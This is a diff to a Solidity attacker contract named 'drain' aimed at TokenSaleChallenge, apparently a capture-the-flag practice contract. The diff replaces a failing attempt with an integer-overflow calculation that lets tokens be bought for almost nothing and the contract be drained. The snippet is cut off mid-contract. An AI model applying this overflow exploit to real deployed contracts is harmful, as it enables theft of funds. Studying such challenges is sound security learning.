@@ -27,25 +27,18 @@ contract TokenSaleChallenge {
 }
 
 contract drain {
-    TokenSaleChallenge public tokenCon;
+    TokenSaleChallenge tsc;
 
-    function drain(address conAddress) public {
-        tokenCon = TokenSaleChallenge(conAddress);
+    constructor(address conAddress) public {
+      tsc = TokenSaleChallenge(conAddress);
     }
 
-    // successfully overflows the uint256 type as TokenSaleChallenge doesn't
-    // handle overflows or underflows
-    function overflow() public pure returns (uint256 over) {
-        uint256 max = 2**256 - 1;
-        return max + 1;
-    }
-
-
-    // currently resulting in a revert, need to determine the failure point
-    function withdrawFromCon() public payable {
-        uint256 depAmount = overflow();
-        tokenCon.buy.value(depAmount * 1 ether)(depAmount);
-        tokenCon.sell(depAmount);
+    function overflow() public pure returns (uint256 amount, uint256 tokens) {
+        uint256 max = 2**256-1;                 // Max value possible held in uint256
+        uint256 denom = 10**18;                 // 1 ether == 10^18 wei
+        uint256 buyTokens = (max / denom) + 1;  // calculate # of tokens to buy
+        uint256 over = buyTokens * denom % max; // calculate value to send
+        return (over, buyTokens);
     }
 
     function receive() external payable {
